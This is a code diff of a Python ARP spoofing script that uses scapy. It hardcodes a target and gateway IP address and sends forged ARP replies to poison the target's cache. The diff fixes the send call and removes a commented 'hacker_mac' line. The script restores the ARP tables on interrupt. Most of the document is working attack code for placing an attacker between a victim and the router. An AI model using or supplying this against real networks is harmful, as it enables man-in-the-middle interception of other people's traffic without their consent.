@@ -1,8 +1,7 @@
 #! usr/env/bin/python
 import scapy.all as scapy
 import time
-import sys
-#hacker_mac = "00:0c:29:d5:cb:65"
+
 target_ip = "192.168.159.143"
 gateway_ip = "192.168.159.2"
 
@@ -21,13 +20,13 @@ def Spoof(target_ip,spoof_ip):
     target_mac = Get_MAC(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     #                 Target Machine (IP ADDRESS) Target Machine (MAC ADDRESS) Router's IP ADDRESS
-    scapy.sendp(packet,verbose=False)
+    scapy.send(packet,verbose=False)
 
 def restoring(destination_ip,source_ip):
     destination_mac = Get_MAC(destination_ip)
     source_mac = Get_MAC(source_ip)
     packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc = source_ip,hwsrc=source_mac)
-    scapy.sendp(packet,count  = 4,verbose=False)
+    scapy.send(packet,count  = 4,verbose=False)
 
 n_packets = 0
 try:
@@ -41,4 +40,3 @@ except KeyboardInterrupt:
     print("\n[+] Received CTRL+C ---- Restoring ARP Spoofing")
     restoring(target_ip, gateway_ip)
     restoring(gateway_ip, target_ip)
-
